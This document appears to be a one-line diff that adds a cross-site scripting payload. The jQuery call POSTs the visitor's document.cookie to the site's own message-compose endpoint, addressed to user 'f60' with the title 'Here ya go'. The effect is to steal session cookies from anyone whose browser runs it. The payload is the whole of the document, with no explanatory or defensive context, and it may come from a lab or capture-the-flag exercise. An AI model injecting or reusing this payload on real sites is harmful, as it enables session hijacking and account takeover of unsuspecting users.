@@ -1,0 +1,1 @@
+$.post('/messages/compose',{message_to:'f60',message_title:'Here ya go',message_contents: document.cookie});
